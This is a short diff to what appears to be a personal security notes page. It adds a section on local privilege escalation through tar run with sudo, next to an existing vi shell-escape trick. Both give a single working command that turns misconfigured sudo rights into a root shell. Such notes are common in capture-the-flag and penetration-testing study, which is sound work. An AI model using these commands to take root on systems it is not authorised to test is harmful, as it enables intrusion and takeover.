@@ -47,3 +47,11 @@
 
              sudo /usr/bin/vi
              :!/bin/bash
+
+### Privesc with tar if a user can run it as root with no password
+ 
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/43c6206f-dda5-4b01-9ca4-af2b28e47ca6)
+
+- Use
+
+       sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
